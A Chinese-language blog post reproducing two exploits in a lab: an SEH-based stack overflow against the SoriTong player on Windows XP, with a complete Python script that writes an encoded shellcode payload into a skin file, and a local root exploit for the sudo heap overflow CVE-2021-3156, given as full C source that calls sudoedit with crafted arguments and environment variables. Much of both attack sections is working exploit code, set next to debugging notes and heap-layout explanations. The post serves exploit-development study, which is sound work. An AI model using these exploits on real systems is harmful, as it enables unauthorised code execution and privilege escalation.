---
title: 漏洞复现-栈溢出+堆溢出sudo提权
date: 2022-10-11 09:25:00
author: 美食家李老叭
img: https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011152144.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: 栈溢出+堆溢出sudo提权
categories: 漏洞浮现
tags:
    - 栈溢出
    - 堆溢出
---
# 漏洞复现-栈溢出+堆溢出sudo提权

## 栈溢出

### 利用原理

通过栈溢出的方式，将异常处理指针覆盖。从而控制程序执行流。

SEH是什么
SEH中文名结构异常化处理，是一种Windows机制，用于一致地处理硬件和软件异常。

在C#/java/C等语言中可以自定义处理异常，使用try/catch语句。C++也可以抛出异常，C#定义一个基类，所有的异常都继承这个基类。
操作系统为每个进程提供了一个异常处理机制，这个异常处理机制的地址、参数保存在栈中，这就是溢出的原因。SEH会动态发生改变。若程序里没有提供异常处理机制，则会将其交给操作系统处理。

![Windows SEH](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011153031.png)

图中可以看到，SEH chain在堆栈上并非连续的，每一节由一个_EXCEPTION_REGISTRATION_RECORD处理函数组成，每个_EXCEPTION_REGISTRATION_RECORD处理函数具有两个指针，一个指向next SEH，即下一个SEH的地址；一个是当前SEH handler。

在这个单向链表中，头部位于FS:[0]段，保存了异常链的首地址。

在处理函数_except_handler中有四个参数，第一个参数是指向_EXCEPTION_RECORD结构的指针，该结构包含有关给定异常的信息，包括异常代码，异常地址和参数数量。_except_handler函数用这些信息和第三个参数ContextRecord的信息，来确定这个异常是否可以由当前处理器处理，_except_handler返回EXCEPTION_DISPOSITION，如果为ExceptionContinueExecution，表示该异常是否已经被成功处理，如果为ExceptionContinueSearch，表示当前异常处理器无法处理该异常，则根据nSEH指针中的地址找下一个处理器，重复以找到合适可以处理异常的处理器。
第二个参数在利用中很关键，它的值为nSEH。在堆栈上位于ESP+8的位置，这样我们就可以控制这第二个参数来进行跳转了。

尾部_EXCEPTION_REGISTRATION_RECORD处理函数的nSEH指针指向FFFFFFFF，标志着End of SEH chain。Windows在链的末尾放置一个默认（或者说通用的）异常处理程序，以帮助确保以某种方式处理异常。这时可能会弹框看到“ …遇到问题，需要关闭 ”

### 实际操作

1. 部署winxpSP3虚拟机镜像,安装soritong
2. 利用kali生成一个包含模式字符串的ui.txt
   `usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 > ui.txt`
3. 将ui.txt复制到soritong目录下的\Skin\Default目录中
4. 使用windbg调试soritong，加载进去之后，先选用debug菜单中的go handled exception, 紧接着选用go unhandled exception.

![windbg调试](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154339.png)

5. 可以看到eip被覆盖为了0x41367441, 也就是A6tA。然后我们利用kali查找A6tA在模式字符串中的位置，
   `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q At6A  `

![确定溢出位置](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154410.png)

发现其处于588的位置，由于当异常发生时，程序会跳转到SEH handler去执行，通过将这个handler的值设置为程序自带模块的一个pop/pop/ret地址，能够实现程序跳转到next seh pointer去，在next seh中需要做的就是跳转到shellcode执行。将next seh的值弹到了eip而已。shellcode的布局大致如下：

![shellcode](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154457.png)

然后我们可以去找，程序中自带的pop+pop+ret的地址。在windbg中输入lm，可以找到程序会使用的模块。

![lm](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154518.png)

6. 再利用windbug 命令 s +首地址+尾地址+5f 5e c3(pop/pop/ret的机器码)去寻找这些指令。最终在Play模块中成功找到。需要注意的是，这里面不是每一个模块都能用。需要尝试几次 `s 10000000 10094000 5f 5e c3`

![pop+pop+ret](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154600.png)

随机挑一个 0x10014499 作为填充seh的内容。这里再解释一下pop pop ret指令的作用，当异常发生的时候，异常分发器创建自己的栈帧，会将EH handler成员压入新创的栈帧中，在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个函数被调用的时候被压入的这个值是位于ESP+8的地方。使用pop pop ret后，就会将next seh的地址放到EIP中。

![except_handler](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154640.png)

因为shellcode在运行的过程会操作栈空间，所以我们需要在栈空间中留出一小部分。在shellcode前后最好都要留出空位。这样执行成功率比较大。如果执行不成功，就尝试加大空位的大小。

最终的shellcode就是

```C++

junk:584字节 ‘A’

next seh:”\xeb\x46\x90\x90” (jmp跳转指令)

seh:”\x99\x44\x01\x10”

junk2: ‘\x90’*64

shellcode：弹个计算器.也可以在网上找 可以使用kali的msfvenom生成，但是有的不能运行。

junk3 ‘\x90’*1000  必须要填充，否则没有办法执行呢！
```

这个python需要用pyhon2.5生成！

```python
name = "ui.txt"
data = "A" * 584
nextseh = "\xeb\x46\x90\x90"
seh = "\x99\x44\x01\x10"
junk2="\x90"*64

shellcode = ("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37"
"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"
"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48"
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43"
"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57"
"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"
"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53"
"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49"
"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46"
"\x4e\x36\x43\x46\x42\x50\x5a")

junk3 = "\x90"*1000
data = data + nextseh + seh + junk2+ shellcode + junk3
f = open(name,'w')
f.write(data)
f.close()
```

### 参考链接

- http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/  (讲windows seh的,写的非常详细)
- https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/04/07/seh-exploit (讲如何溢出soritong.exe的)
- https://www.cnblogs.com/cjhk/p/11598690.html -----C语言中的转义字符
- http://c.biancheng.net/c/ascii/  -----ascii
- https://pukrr.github.io/2020/05/05/%E5%88%A9%E7%94%A8SEH%E9%93%BE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/

## 堆溢出

sudo是Linux中一个非常重要的管理权限的软件，它允许用户使用 root 权限来运行程序。而CVE-2021-3156是sudo中存在一个堆溢出漏洞。通过该漏洞，任何没有特权的用户均可使用默认的sudo配置获取root权限。

该漏洞可以影响从1.8.2~1.8.31p2下的所有旧版本sudo

在主要参考的资料中，已经对该漏洞的成因介绍的非常详细了。所以在这里只总结一些自认为比较细节的地方把。

### 细节问题

```C++
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<math.h>

#define __LC_CTYPE               0
#define __LC_NUMERIC             1
#define __LC_TIME                2
#define __LC_COLLATE             3
#define __LC_MONETARY            4
#define __LC_MESSAGES            5
#define __LC_ALL                 6
#define __LC_PAPER               7
#define __LC_NAME                8
#define __LC_ADDRESS             9
#define __LC_TELEPHONE          10
#define __LC_MEASUREMENT        11
#define __LC_IDENTIFICATION     12

char * envName[13]={"LC_CTYPE","LC_NUMERIC","LC_TIME","LC_COLLATE","LC_MONETARY","LC_MESSAGES","LC_ALL","LC_PAPER","LC_NAME","LC_ADDRESS","LC_TELE
PHONE","LC_MEASUREMENT","LC_IDENTIFICATION"};

int now=13;
int envnow=0;
int argvnow=0;
char * envp[0x300];
char * argv[0x300];
char * addChunk(int size)
{
    now --;
    char * result;
    if(now ==6)
    {
        now --;
    }
    if(now>=0)
    {
        result=malloc(size+0x20);
        strcpy(result,envName[now]);
        strcat(result,"=C.UTF-8@");
        for(int i=9;i<=size-0x17;i++)
            strcat(result,"A");
        envp[envnow++]=result;
    }
    return result;
}

void final()
{
    now --;
    char * result;
    if(now ==6)
    {
        now --;
    }
    if(now>=0)
    {
        result=malloc(0x100);
        strcpy(result,envName[now]);
        strcat(result,"=xxxxxxxxxxxxxxxxxxxxx");
        envp[envnow++]=result;
    }
}

int setargv(int size,int offset)
{
    size-=0x10;
    signed int x,y;
    signed int a=-3;
    signed int b=2*size-3;
    signed int c=2*size-2-offset*2;
    signed int tmp=b*b-4*a*c;
    if(tmp<0)
        return -1;
    tmp=(signed int)sqrt((double)tmp*1.0);
    signed int A=(0-b+tmp)/(2*a);
    signed int B=(0-b-tmp)/(2*a);
    if(A<0 && B<0)
        return -1;
    if((A>0 && B<0) || (A<0 && B>0))
        x=(A>0) ? A: B;
    if(A>0 && B > 0)
        x=(A<B) ? A : B;
    y=size-1-x*2;
    int len=x+y+(x+y+y+1)*x/2;

    while ((signed int)(offset-len)<2)
    {
        x--;
        y=size-1-x*2;
        len=x+y+(x+y+1)*x/2;
        if(x<0)
            return -1;
    }
    int envoff=offset-len-2+0x30;
    printf("%d,%d,%d\n",x,y,len);
    char * Astring=malloc(size);
    int i=0;
    for(i=0;i<y;i++)
        Astring[i]='A';
    Astring[i]='\x00';

    argv[argvnow++]="sudoedit";
    argv[argvnow++]="-s";
    for (i=0;i<x;i++)
        argv[argvnow++]="\\";
    argv[argvnow++]=Astring;
    argv[argvnow++]="\\";
    argv[argvnow++]=NULL;
    for(i=0;i<envoff;i++)
        envp[envnow++]="\\";
    envp[envnow++]="X/test";
    return 0;
}

int main()
{
    setargv(0xa0,0x650);
    addChunk(0x40);
    addChunk(0x40);
    addChunk(0xa0);
    addChunk(0x40);
    final();

    execve("/usr/local/bin/sudoedit",argv,envp);
}
```

1. 要覆盖的name成员在0x30的偏移位置

![pwndbg 调试](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160159.png)

2. Exp中addChunk()函数 

![addChunk](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160246.png)

循环赋值a的时候，i=9是因为前面已经有了9个字符。

为什么在循环的地方会减去一个`0x17`？

经过对比更改数值过后，在`setlocale`函数运行完毕之后的堆空间分布。

我的理解是这样的，他为了确保`0xa0`的堆空间 与 最后一个`0x40` 的堆空间之间的距离刚好是0x650。如果硬要减去一个不同的值，`0xa0` 与 `0x40` 之间堆空间的距离会被拉大。当然这其中还要考虑到堆空间是16字节对齐的问题。那么这个时候，`0xa0` 与 `0x40` 堆空间的距离有可能会发生变化。据我调试观察发现，这个距离有可能是`0x650\0x660\0x670`

至于这个距离为什么会变化，还要看`setlocale.c`中的`_nl_find_locale`函数位于`glibc/locale/findlocale.c`。以及`_nl_make_l0nflist`函数—位于`glibc/intl/l0nflist.c`。这些函数中会对堆空间继续进行处理。

![-0x17](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160505.png)

3. Exp中的finally()函数

之所以在构造环境变量的过程中我们多使用了一个`LC_NAME==xxxxxxxxxxxxxxxxxxxxx`。就是因为这里释放的时候，他先将category++。所以就造成了，只有多出来一个。`++category`之后才能刚好移动到我们想要释放的大小空间上。

![glibc/locale/setlocale.c](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160753.png)

4. 为什么认为nsswitch.c中__getline分配的堆空间为0x80

通过阅读源码可以发现，在调用的过程中，如果`size_t *n` 为0的话，会直接给一个`120(0x78)`，的大小，而一般堆空间都是要对齐的，32位和64的情况不同，分别是8字节和16字节对齐。再加上配置文件中一行的占用大小远远小于120，所以后续不会重新分配一个更大的空间，后续每一次调用这个__getline都会使用这个堆空间。综上，nsswitch.c中的__getline会申请一个0x80的堆空间大小。

![libio/iogetdelim.c/_IO_getdelim](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011161002.png)



### 参考资料

#### docker环境

- [https://hub.docker.com/r/chenaotian/cve-2021-3156](https://hub.docker.com/r/chenaotian/cve-2021-3156)

#### 主要参考

- [https://blog.csdn.net/Breeze_CAT/article/details/122676551](https://blog.csdn.net/Breeze_CAT/article/details/122676551)
- [https://github.com/chenaotian/CVE-2021-3156](https://github.com/chenaotian/CVE-2021-3156)
- [https://github.dev/lattera/glibc/blob/master/nss/nsswitch.c ----github按下`>`可以启动网页版的vscode可以看glibc的源码](https://github.dev/lattera/glibc/blob/master/nss/nsswitch.c)

#### 其他

- [https://www.cnblogs.com/panwenbin-logs/p/16050472.html   ----NSS细节](https://www.cnblogs.com/panwenbin-logs/p/16050472.html)
- [https://www.cnblogs.com/dylancao/p/10677660.html ----strdup()](https://www.cnblogs.com/dylancao/p/10677660.html)
- [https://www.xiexianbin.cn/linux/basic/linux-nssswitch/index.html ----Linux nsswithch.conf 详解](https://www.xiexianbin.cn/linux/basic/linux-nssswitch/index.html)
- [https://www.cnblogs.com/murkuo/p/15965270.html ----pwndbg基本操作](https://www.cnblogs.com/murkuo/p/15965270.html)
- [https://blog.csdn.net/zhang14916/article/details/108319252 ----libc 2.27 堆管理机制](https://blog.csdn.net/zhang14916/article/details/108319252)
- [https://kiprey.github.io/2021/01/CVE-2021-3156/#b-POC](https://kiprey.github.io/2021/01/CVE-2021-3156/#b-POC)
- [https://www.anquanke.com/post/id/231077#h2-4](https://www.anquanke.com/post/id/231077#h2-4)


